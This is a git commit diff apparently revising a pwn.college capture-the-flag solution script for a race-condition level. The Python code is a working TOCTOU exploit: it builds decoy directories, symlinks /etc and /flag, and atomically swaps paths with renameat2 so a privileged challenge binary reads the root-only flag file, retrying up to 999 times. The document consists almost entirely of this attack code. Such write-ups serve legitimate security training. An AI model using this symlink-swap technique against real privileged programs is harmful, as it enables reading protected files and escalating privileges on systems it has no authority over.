066e76f6e0763f5306cdd6a76f1d6b152064948d
九条涼果 <enihsyou@gmail.com>
2026-07-27 18:12:59 +0800

    feat(pwn): Race Conditions Level 6

--- challenges/legacy/system-security/race-conditions/level5-1/flag.py
+++ challenges/legacy/system-security/race-conditions/level5-1/flag.py
@@ -2,6 +2,7 @@
 import ctypes
 import os
 import tempfile
+from contextlib import suppress
 
 import pwn
 from dojotool import find_challenge
@@ -10,52 +11,41 @@ from dojotool import find_challenge
 def ctf() -> None:
     root_bin = find_challenge()
 
-    # def swap(a, b):
-    #     c = a + "_tmp"
-    #     os.rename(a, c)
-    #     os.rename(b, a)
-    #     os.rename(c, b)
-
     libc = ctypes.CDLL(None)
 
     def swap(a, b):
         libc.renameat2(-100, a.encode(), -100, b.encode(), 2)
 
-    i = 0
-    while True:
-        print(i)
-        i += 1
-        try:
-            with tempfile.TemporaryDirectory() as tmpdir:
-                d1 = tmpdir + "/etc1"
-                d2 = tmpdir + "/etc2"
-                d3 = tmpdir + "/etc3"
+    for count in range(1, 1000):
+        print(f"Attempt {count}")
+        with suppress(Exception), tempfile.TemporaryDirectory() as tmpdir:
+            d1 = tmpdir + "/etc1"
+            d2 = tmpdir + "/etc2"
+            d3 = tmpdir + "/etc3"
 
-                os.mkdir(d1)
-                open(d1 + "/hosts", "w").close()
+            os.makedirs(d1 + "/apt")
+            open(d1 + "/apt/sources.list", "w").close()
 
-                os.symlink("/etc", d2)
+            os.symlink("/etc", d2)
 
-                os.mkdir(d3)
-                os.symlink("/flag", d3 + "/hosts")
-                
-                with pwn.process([root_bin, d1 + "/hosts"], raw=True, level="error") as io:
-                    # io.recvuntil(b"Paused")
-                    # io.sendline()
+            os.makedirs(d3 + "/apt")
+            os.symlink("/flag", d3 + "/apt/sources.list")
 
-                    # io.recvuntil(b"Paused")
-                    swap(d2, d1)
-                    # io.sendline()
+            with pwn.process([root_bin, d1 + "/apt/sources.list"], raw=True, level="error") as io:
+                # io.recvuntil(b"Paused")
+                # io.sendline()
 
-                    # io.recvuntil(b"Paused")
-                    swap(d3, d1)
-                    # io.sendline()
-                    data = io.recvrepeat().decode(errors="ignore")
-                    if "pwn.college{" in data:
-                        print(data)
-                        break
-        except Exception:
-            pass
+                # io.recvuntil(b"Paused")
+                swap(d2, d1)
+                # io.sendline()
+
+                # io.recvuntil(b"Paused")
+                swap(d3, d1)
+                # io.sendline()
+                data = io.recvrepeat().decode(errors="ignore")
+                if "pwn.college{" in data:
+                    print(data)
+                    break
 
 
 if __name__ == "__main__":
